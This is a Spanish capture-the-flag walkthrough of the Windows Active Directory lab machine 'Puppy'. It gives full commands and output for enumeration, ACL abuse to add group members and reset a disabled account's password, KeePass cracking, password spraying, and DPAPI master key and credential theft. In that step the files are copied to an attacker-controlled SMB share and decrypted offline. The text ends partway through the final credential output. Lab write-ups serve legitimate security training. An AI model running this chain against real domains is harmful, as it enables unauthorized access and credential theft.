
# Puppy

<figure><img src="/files/v1S9axv4xmsw0eJsjTAg" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Información General</mark>

* **Nombre de la máquina:** `Puppy`
* **IP:** `10.10.11.70`
* **Sistema operativo:** `Windows`
* **Dificultad:** `🟡 Media`
* **Fecha:** `26/05/2025`

## <mark style="color:purple;">Pista inicial</mark>

La plataforma nos proporciona las credenciales iniciales para esta máquina:

```
levi.james / KingofAkron2025!
```

## <mark style="color:purple;">Primer acceso</mark>

Añadimos la IP `10.10.11.70` a nuestro `/etc/hosts` y accedemos través del navegador.

```bash
sudo echo "10.10.11.70 puppy.htb" | sudo tee -a /etc/hosts
```

## <mark style="color:purple;">Escaneo de puertos</mark>

```bash
sudo nmap -v -sV -T5 10.10.11.70
```

```bash
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-21 19:47:38Z)
111/tcp  open  rpcbind       2-4 (RPC #100000)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
2049/tcp open  nlockmgr      1-4 (RPC #100021)
3260/tcp open  iscsi?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Encontramos multitud de puertos abiertos, lo normal en máquinas Windows. Ademas nos encontramos con que la máquina objetivo es un Domain Controller, por la presencia de los puertos 3268 o 389, reservados para DCs.

Destacan los puertos:

* `111 (RPC)` - Puede contener recursos compartidos o enumerar usuarios
* `445 (SMB)` - Recursos compartidos y enumeración
* `5985 (WinRM)` - Acceso con EvilWinRM con contraseña
* `88 (Kerberos)` - Posible Kerberoasting o AS-REP Roasting

## <mark style="color:purple;">Enumeración inicial</mark>

```
enum4linux-ng puppy.htb
```

## <mark style="color:purple;">Enumeración con credenciales</mark>

### Shares - Recursos compartidos

```bash
crackmapexec smb puppy.htb -u levi.james -p 'KingofAkron2025!' --shares

SMB         puppy.htb       445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         puppy.htb       445    DC               [+] PUPPY.HTB\levi.james:KingofAkron2025! 
SMB         puppy.htb       445    DC               [+] Enumerated shares
SMB         puppy.htb       445    DC               Share           Permissions     Remark
SMB         puppy.htb       445    DC               -----           -----------     ------
SMB         puppy.htb       445    DC               ADMIN$                          Remote Admin
SMB         puppy.htb       445    DC               C$                              Default share
SMB         puppy.htb       445    DC               DEV                             DEV-SHARE for PUPPY-DEVS
SMB         puppy.htb       445    DC               IPC$            READ            Remote IPC
SMB         puppy.htb       445    DC               NETLOGON        READ            Logon server share 
SMB         puppy.htb       445    DC               SYSVOL          READ            Logon server share 
```

Encontramos un Share DEV interesante, pero no tenemos permisos de lectura, y analizando el resto de Shares no encontramos nada relevante. Seguramente si conseguimos un usuario del grupo DEVELOPERS podríamos acceder.

### Usuarios

```bash
crackmapexec smb puppy.htb -u levi.james -p 'KingofAkron2025!' --users

SMB         puppy.htb       445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         puppy.htb       445    DC               [+] PUPPY.HTB\levi.james:KingofAkron2025! 
SMB         puppy.htb       445    DC               [+] Enumerated domain user(s)
SMB         puppy.htb       445    DC               PUPPY.HTB\steph.cooper_adm               badpwdcount: 0 desc: 
SMB         puppy.htb       445    DC               PUPPY.HTB\steph.cooper                   badpwdcount: 0 desc: 
SMB         puppy.htb       445    DC               PUPPY.HTB\jamie.williams                 badpwdcount: 2 desc: 
SMB         puppy.htb       445    DC               PUPPY.HTB\adam.silver                    badpwdcount: 11 desc: 
SMB         puppy.htb       445    DC               PUPPY.HTB\ant.edwards                    badpwdcount: 0 desc: 
SMB         puppy.htb       445    DC               PUPPY.HTB\levi.james                     badpwdcount: 0 desc: 
SMB         puppy.htb       445    DC               PUPPY.HTB\krbtgt                         badpwdcount: 0 desc: Key Distribution Center Service Account
SMB         puppy.htb       445    DC               PUPPY.HTB\Guest                          badpwdcount: 0 desc: Built-in account for guest access to the computer/domain
SMB         puppy.htb       445    DC               PUPPY.HTB\Administrator                  badpwdcount: 0 desc: Built-in account for administering the computer/domain
```

Añadimos los usuarios encontramos a un archivo `valid-users.txt`. Probar a volcar tickets Kerberos mediante ASREP-Roasting falla:

```
GetNPUsers.py puppy.htb/ -usersfile valid-users.txt -dc-ip 10.10.11.70

Impacket v0.13.0.dev0+20250430.174957.756ca96e - Copyright Fortra, LLC and its affiliated companies 

[-] User steph.cooper doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jamie.williams doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User ant.edwards doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User levi.james doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
```

## <mark style="color:purple;">Enumeración con Bloodhound</mark>

### Editar resolv.conf

<pre class="language-bash"><code class="lang-bash">sudo gedit /etc/resolv.conf
<strong>
</strong><strong>domain puppy.htb
</strong>nameserver 10.10.11.70
search puppy.htb
</code></pre>

### Bloodhound Python

```bash
bloodhound-python -u levi.james -p 'KingofAkron2025!' -d puppy.htb -c all --zip

INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: puppy.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc.puppy.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.puppy.htb
INFO: Found 10 users
INFO: Found 56 groups
INFO: Found 3 gpos
INFO: Found 3 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.PUPPY.HTB
INFO: Done in 00M 10S
INFO: Compressing output into 20250521152019_bloodhound.zip
```

### Análisis con Bloodhound

Encontramos que el usuario `levi.james` pertenece al grupo HR, que a su ver tiene permisos `GenericWrite` sobre el grupo DEVELOPERS.

<figure><img src="/files/eaOwUyMNTo1NHNewTrag" alt=""><figcaption></figcaption></figure>

En el grupo DEVELOPERS encontramos 3 miembros:

* `ant.edwards`
* `adam.silver`
* `jamie.williams`

<figure><img src="/files/M9qG4nhf4hv63n20K7Kj" alt=""><figcaption></figcaption></figure>

Analizando a los 3 usuarios vemos que el usuario `ant.edwards` es miembro del grupo SENIOR DEVS y este grupo tiene permisos `GenericAll` sobre el usuario `adam.silver`

<figure><img src="/files/1LnFwFpYeR8Zmdpc98Ox" alt=""><figcaption></figcaption></figure>

Los usuarios `adam.silver` y `jamie.williams` tienen permisos `AllExtendedRights` sobre el grupo ADMINISTRATORS, del cual es miembro el usuario `steph.cooper`.

<figure><img src="/files/h1mvCUV6PNnbtJZc1pI0" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/AVug8fyjWXA6E5PvR4Pd" alt=""><figcaption></figcaption></figure>

### **Resumen de Relaciones de Privilegio**

#### Levi.james → HR → DEVELOPERS → SENIOR DEVS → ADMINISTRATORS

1. ✅ `levi.james` → **HR**
2. ✅ HR tiene **GenericWrite** sobre el grupo **DEVELOPERS**
3. ✅ **DEVELOPERS** incluye a:
   * `ant.edwards`
   * `adam.silver`
   * `jamie.williams`
4. ✅ `ant.edwards` → **SENIOR DEVS**
5. ✅ **SENIOR DEVS** tiene **GenericAll** sobre `adam.silver`
6. ✅ `adam.silver` y `jamie.williams` tienen **AllExtendedRights** sobre el grupo **ADMINISTRATORS**
7. ✅ `steph.cooper` → **ADMINISTRATORS**

## <mark style="color:purple;">Ruta de escalada</mark>

```
levi.james
  └─ HR (GenericWrite sobre DEVELOPERS)
      └─ DEVELOPERS (contiene ant.edwards)
          └─ SENIOR DEVS (GenericAll sobre adam.silver)
              └─ adam.silver (AllExtendedRights sobre ADMINISTRATORS)
                  └─ steph.cooper (miembro de Administrators)
```

### 1. Añadir a levi.james al grupo DEVELOPERS

```bash
git clone https://github.com/CravateRouge/bloodyAD.git
cd bloodyAD
pip3 install -r requirements.txt
```

```bash
bloodyAD -u levi.james -p 'KingofAkron2025!' -d puppy.htb --host 10.10.11.70 add groupMember 'DEVELOPERS' 'levi.james'

[+] levi.james added to DEVELOPERS
```

#### Confirmación

{% code overflow="wrap" %}

```bash
bloodyAD -u levi.james -p 'KingofAkron2025!' -d puppy.htb --host 10.10.11.70 get object 'levi.james' --attr memberOf  

distinguishedName: CN=Levi B. James,OU=MANPOWER,DC=PUPPY,DC=HTB
memberOf: CN=DEVELOPERS,DC=PUPPY,DC=HTB; CN=HR,DC=PUPPY,DC=HTB
```

{% endcode %}

Ahora tenemos acceso a SENIOR DEVS. Parece que no podemos acceder a ningún equipo, ni cambiar la contraseña de `adam.silver` directamente, por lo que vamos a volver a numerar los Shares:

```bash
nxc smb 10.10.11.70 -u levi.james -d PUPPY.HTB -p 'KingofAkron2025!' --shares

SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\levi.james:KingofAkron2025! 
SMB         10.10.11.70     445    DC               [*] Enumerated shares
SMB         10.10.11.70     445    DC               Share           Permissions     Remark
SMB         10.10.11.70     445    DC               -----           -----------     ------
SMB         10.10.11.70     445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.70     445    DC               C$                              Default share
SMB         10.10.11.70     445    DC               DEV                             DEV-SHARE for PUPPY-DEVS
SMB         10.10.11.70     445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.70     445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.11.70     445    DC               SYSVOL          READ            Logon server share 
```

Ahora ya si tenemos permisos de lectura en el Share DEV. Vamos a ver que hay en su interior:

```bash
smbclient -U levi.james \\\\10.10.11.70\\DEV
                                                
Password for [WORKGROUP\levi.james]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Thu May 22 01:00:04 2025
  ..                                  D        0  Sat Mar  8 17:52:57 2025
  KeePassXC-2.7.9-Win64.msi           A 34394112  Sun Mar 23 08:09:12 2025
  Projects                            D        0  Sat Mar  8 17:53:36 2025
  recovery.kdbx                       A     2677  Wed Mar 12 03:25:46 2025

		5080575 blocks of size 4096. 1522726 blocks available
		
smb: \> get recovery.kdbx 
getting file \recovery.kdbx of size 2677 as recovery.kdbx (17,2 KiloBytes/sec) (average 17,2 KiloBytes/sec)
```

Encontramos varios archivos interesantes:

* `KeePassXC-2.7.9-Win64.msi` - Instalador de KeePassXC (gestor de contraseñas). Potencialmente indica que se usa esta app para guardar credenciales.
* `recovery.kdbx` - Archivo de base de datos de KeePass

### 2. Extracción de recovery.kdbx

Nos descargamos el archivo `recovery.kdbx` y al crackearlo con `keepass2john` nos da un error que significa que el archivo `.kdbx` fue creado con una **versión más nueva del formato KeePass** que `keepass2john` **no soporta aún**.

```
keepass2john recovery.kdbx > keepass.hash
! recovery.kdbx : File version '40000' is currently not supported!
```

Para crackearlo usaremos la alternativa `keepass4brute`:

{% embed url="<https://github.com/r3nt0n/keepass4brute.git>" %}

```bash
bash keepass4brute.sh recovery.kdbx /usr/share/wordlists/rockyou.txt 

keepass4brute 1.3 by r3nt0n
https://github.com/r3nt0n/keepass4brute

[+] Words tested: 36/14344392 - Attempts per minute: 72 - Estimated time remaining: 19 weeks, 5 days
[+] Current attempt: liverpool

[*] Password found: liverpool
```

Vamos a abrirlo con `keepassxc`, ponemos la contraseña y vemos el contenido correctamente:

```bash
keepassxc recovery.kdbx
```

<figure><img src="/files/WozwQARjVGToiLT7tbIC" alt=""><figcaption></figcaption></figure>

Ahora creamos un archivo de volcado XML desde Base de datos > Exportar > Archivo XML. Lo guardamos con el nombre `keepass_dump.xml`.

Ahora con el siguiente script en python haremos el volcado de las contraseñas de `keepass_dump.xml`:

{% code title="extract\_keepass.py" %}

```python
import xml.etree.ElementTree as ET

tree = ET.parse('keepass_dump.xml')
root = tree.getroot()

for entry in root.iter('Entry'):
    username = None
    password = None
    for string in entry.findall('String'):
        key = string.find('Key').text  # Corregido de 'key' a 'Key' (mayúscula)
        value = string.find('Value').text
        if key == 'Username':
            username = value
        elif key == 'Password':
            password = value
    if username or password:
        print(f"User: {username}, Password: {password}")
```

{% endcode %}

```
python3 extract_keepass.py

User: None, Password: JamieLove2025!
User: None, Password: HJKL2025!
User: None, Password: HJKL2025!
User: None, Password: Antman2025!
User: None, Password: Antman2025!
User: None, Password: Steve2025!
User: None, Password: Steve2025!
User: None, Password: ILY2025!
User: None, Password: ILY2025!
```

Bingo! Tenemos las contraseñas. Las guardamos en un archivo de texto y haremos un Password Spraying, ya que tenemos la lista de usuarios válidos.

### 3. Password Spraying

```bash
nxc smb 10.10.11.70 -u valid-users.txt -p passwords.txt -d PUPPY.HTB

SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\steph.cooper_adm:JamieLove2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\steph.cooper:JamieLove2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\jamie.williams:JamieLove2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\adam.silver:JamieLove2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\ant.edwards:JamieLove2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\levi.james:JamieLove2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\krbtgt:JamieLove2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\Guest:JamieLove2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\Administrator:JamieLove2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\steph.cooper_adm:HJKL2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\steph.cooper:HJKL2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\jamie.williams:HJKL2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\adam.silver:HJKL2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\ant.edwards:HJKL2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\levi.james:HJKL2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\krbtgt:HJKL2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\Guest:HJKL2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\Administrator:HJKL2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\steph.cooper_adm:Antman2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\steph.cooper:Antman2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\jamie.williams:Antman2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\adam.silver:Antman2025! STATUS_LOGON_FAILURE 
SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\ant.edwards:Antman2025! 
```

Bingo! Tenemos la contraseña de `ant.edwards:Antman2025!`&#x20;

### 4. Bloodhound con ant.edwards

Usando estas credenciales volvemos a ejecutar bloodhound-python para obtener más información del dominio. Observamos que `ant.edwards` pertenece al grupo `SENIOR DEVS` y tiene permisos `GenericAll` sobre `adam.silver`:

<figure><img src="/files/Y8cszz3DZZB05KbjFlB9" alt=""><figcaption></figcaption></figure>

Y vemos que `adam.silver` tiene permisos `AllExtendedRights` sobre el grupo `ADMINISTRATORS`:

<figure><img src="/files/t4AWQmxcaMiAE8JobFv7" alt=""><figcaption></figcaption></figure>

### 5. Confirmación de permisos de escritura

```bash
bloodyAD --host 10.10.11.70 -u Ant.Edwards -p 'Antman2025!' -d PUPPY.HTB get writable --detail | grep -A 10 "distinguishedName: CN=.*DC=PUPPY,DC=HTB"

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=PUPPY,DC=HTB
url: WRITE
wWWHomePage: WRITE

distinguishedName: CN=Anthony J. Edwards,DC=PUPPY,DC=HTB
thumbnailPhoto: WRITE
pager: WRITE
mobile: WRITE
homePhone: WRITE
userSMIMECertificate: WRITE
msDS-ExternalDirectoryObjectId: WRITE
msDS-cloudExtensionAttribute20: WRITE
msDS-cloudExtensionAttribute19: WRITE
msDS-cloudExtensionAttribute18: WRITE
msDS-cloudExtensionAttribute17: WRITE
--
distinguishedName: CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB
ms-net-ieee-80211-GroupPolicy: CREATE_CHILD
nTFRSSubscriptions: CREATE_CHILD
classStore: CREATE_CHILD
ms-net-ieee-8023-GroupPolicy: CREATE_CHILD
shadowFlag: WRITE
shadowExpire: WRITE
shadowInactive: WRITE
shadowWarning: WRITE
shadowMax: WRITE
shadowMin: WRITE
```

### 6. Cambio de contraseña

Después, cambiaremos la contraseña de Adam con la herramienta rpcclient. Sin embargo, la cuenta está deshabilitad&#x61;**.** Por lo tanto, la habilitaremos con la herramienta bloodyAD y luego cambiaremos la contraseña con rpcclient.

```bash
rpcclient -U 'ant.edwards%Antman2025!' 10.10.11.70

rpcclient $> setuserinfo ADAM.SILVER 23 Password@123
rpcclient $> exit
```

#### Cuenta deshabilitada

```bash
nxc smb 10.10.11.70 -u ADAM.SILVER -d PUPPY.HTB -p 'Password@123'

SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\ADAM.SILVER:Password@123 STATUS_ACCOUNT_DISABLED 
```

#### Quitar el Account Disable

<pre class="language-q"><code class="lang-q">bloodyAD --host 10.10.11.70 -d puppy.htb -u ant.edwards -p Antman2025! remove uac 'ADAM.SILVER' -f ACCOUNTDISABLE                                    
<strong>
</strong><strong>[-] ['ACCOUNTDISABLE'] property flags removed from ADAM.SILVER's userAccountControl
</strong></code></pre>

#### Cambiar contraseña con rpcclient

```bash
rpcclient -U 'ant.edwards%Antman2025!' 10.10.11.70

rpcclient $> setuserinfo ADAM.SILVER 23 Password@123
rpcclient $> exit
```

#### Confirmación

```bash
nxc smb 10.10.11.70 -u ADAM.SILVER -d PUPPY.HTB -p 'Password@123'

SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\ADAM.SILVER:Password@123 
```

***

## <mark style="color:purple;">User flag</mark>

### Conexión por EvilWinRM

```bash
evil-winrm -i 10.10.11.70 -u adam.silver -p 'Password@123'

                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline  
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                     
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\adam.silver> cd Desktop
*Evil-WinRM* PS C:\Users\adam.silver\Desktop> ls


    Directory: C:\Users\adam.silver\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         2/28/2025  12:31 PM           2312 Microsoft Edge.lnk
-ar---         5/26/2025   7:29 AM             34 user.txt


*Evil-WinRM* PS C:\Users\adam.silver\Desktop> cat user.txt
259c5e3c5aaa8f6e2e6dae31**********
```

***

## <mark style="color:purple;">Escalada de privilegios</mark>

En el directorio `c:/` nos encontramos un directorio de `Backups` que podría contener credenciales:

```bash
*Evil-WinRM* PS C:\Users\adam.silver\Documents> cd c:/
*Evil-WinRM* PS C:\> ls

    Directory: C:\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          5/9/2025  10:48 AM                Backups
d-----         5/12/2025   5:21 PM                inetpub
d-----          5/8/2021   1:20 AM                PerfLogs
d-r---          4/4/2025   3:40 PM                Program Files
d-----          5/8/2021   2:40 AM                Program Files (x86)
d-----          3/8/2025   9:00 AM                StorageReports
d-r---          3/8/2025   8:52 AM                Users
d-----         5/13/2025   4:40 PM                Windows


*Evil-WinRM* PS C:\> cd Backups
*Evil-WinRM* PS C:\Backups> ls

    Directory: C:\Backups

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          3/8/2025   8:22 AM        4639546 site-backup-2024-12-30.zip

*Evil-WinRM* PS C:\Backups> download site-backup-2024-12-30.zip
                                        
Info: Downloading C:\Backups\site-backup-2024-12-30.zip to site-backup-2024-12-30.zip
                
Info: Download successful!
```

Al descomprimir el zip encontramos un archivo de configuración en XML que contiene las credenciales de steph.cooper!

```xml
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: nms-auth-config.xml.bak
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ <?xml version="1.0" encoding="UTF-8"?>
   2   │ <ldap-config>
   3   │     <server>
   4   │         <host>DC.PUPPY.HTB</host>
   5   │         <port>389</port>
   6   │         <base-dn>dc=PUPPY,dc=HTB</base-dn>
   7   │         <bind-dn>cn=steph.cooper,dc=puppy,dc=htb</bind-dn>
   8   │         <bind-password>ChefSteph2025!</bind-password>
   9   │     </server>
  10   │     <user-attributes>
  11   │         <attribute name="username" ldap-attribute="uid" />
  12   │         <attribute name="firstName" ldap-attribute="givenName" />
  13   │         <attribute name="lastName" ldap-attribute="sn" />
  14   │         <attribute name="email" ldap-attribute="mail" />
  15   │     </user-attributes>
  16   │     <group-attributes>
  17   │         <attribute name="groupName" ldap-attribute="cn" />
  18   │         <attribute name="groupMember" ldap-attribute="member" />
  19   │     </group-attributes>
  20   │     <search-filter>
  21   │         <filter>(&(objectClass=person)(uid=%s))</filter>
  22   │     </search-filter>
  23   │ </ldap-config>
───────┴──────────────────────────────────┴──────────────────────────────────┴───────────────────────────
```

#### Confirmación

```bash
nxc smb 10.10.11.70 -u STEPH.COOPER -d PUPPY.HTB -p 'ChefSteph2025!'

SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\STEPH.COOPER:ChefSteph2025! 
```

### Conexión por EvilWinRM

Al conectarnos vemos que en el desktop no está la flag, por lo que necesitaremos el hash o contraseña del usuario administrator:

```bash
evil-winrm -i 10.10.11.70 -u steph.cooper -p 'ChefSteph2025!'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                            
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\steph.cooper\Documents> cd ..
*Evil-WinRM* PS C:\Users\steph.cooper> cd Desktop
*Evil-WinRM* PS C:\Users\steph.cooper\Desktop> dir

    Directory: C:\Users\steph.cooper\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          3/8/2025   7:40 AM           2312 Microsoft Edge.lnk
```

#### Comprobación de privilegios

```bash
*Evil-WinRM* PS C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

A continuación, buscaremos el archivo de la clave maestra (clave de cifrado) y lo copiaremos a nuestra máquina. Después, también obtendremos el archivo blob de credenciales, que contiene las credenciales de usuario cifradas (como contraseñas o tokens).

La clave maestra es una clave secreta que se utiliza para cifrar y descifrar datos con la API de protección de datos (DPAPI). El blob de credenciales contiene las credenciales de usuario protegidas por DPAPI. Utilizaremos estos archivos para descifrar sin conexión las credenciales protegidas por DPAPI mediante el script `dpapi.py` de Impacket.

Para recuperar los archivos, iniciaremos un servidor SMB y nos aseguraremos de que esté en ejecución durante el proceso. Los archivos (clave maestra y blob de credenciales) se transferirán a la carpeta compartida que creamos en el recurso compartido SMB.

### 1. Iniciar SmbServer

```bash
sudo impacket-smbserver share /tmp/smbshare -smb2support

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```

### 2. Localizar la carpeta de credenciales

```bash
*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect> ls -force

    Directory: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d---s-         5/26/2025   8:55 AM                S-1-5-21-1487982659-1829050783-2281216199-1107
-a-hs-          3/8/2025   7:40 AM             24 CREDHIST
-a-hs-          3/8/2025   7:40 AM             76 SYNCHIST
```

Para ver el contenido de su interior necesitamos hacer un `ls -force`:

```visual-basic
*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107> ls -force


    Directory: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          3/8/2025   7:40 AM            740 556a2412-1275-4ccf-b721-e6a0b4f90407
-a-hs-         5/26/2025   8:55 AM             24 Preferred
```

### **3. Copia la clave maestra DPAPI al recurso compartido**

```powershell
copy 556a2412-1275-4ccf-b721-e6a0b4f90407 \\10.10.15.28\share\masterkey_blob
```

### 4. Copia el blob de contraseñas

```bash
*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Local\Microsoft\Credentials> ls -force

    Directory: C:\Users\steph.cooper\AppData\Local\Microsoft\Credentials

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          3/8/2025   8:14 AM          11068 DFBE70A7E5CC19A398EBF1B96859CE5D

*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Local\Microsoft\Credentials> copy DFBE70A7E5CC19A398EBF1B96859CE5D \\10.10.15.28\share\credential_blob
```

Ahora en nuestro directorio local /tmp/smbshare tenemos los archivos descargados

```bash
ls

credential_blob
masterkey_blob
```

### 5. Conocer el SID

```
*Evil-WinRM* PS C:\> whoami /user

USER INFORMATION
----------------

User Name          SID
================== ==============================================
puppy\steph.cooper S-1-5-21-1487982659-1829050783-2281216199-1107
```

### 6. Desencriptado de clave

```bash
dpapi.py masterkey -file masterkey_blob -password 'ChefSteph2025!' -sid S-1-5-21-1487982659-1829050783-2281216199-1107

Impacket v0.13.0.dev0+20250523.184829.f2f2b367 - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 556a2412-1275-4ccf-b721-e6a0b4f90407
Flags       :        0 (0)
Policy      : 4ccf1275 (1288639093)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
```

### 7. Desencriptado del credential\_blob

FInalmente, obtenemos la contraseña del usuario steph.cooper\_adm: `FivethChipOnItsWay2025!`

```bash
dpapi.py credential -f credential_blob -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84

Impacket v0.13.0.dev0+20250523.184829.f2f2b367 - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2025-03-08 15:54:29+00:00
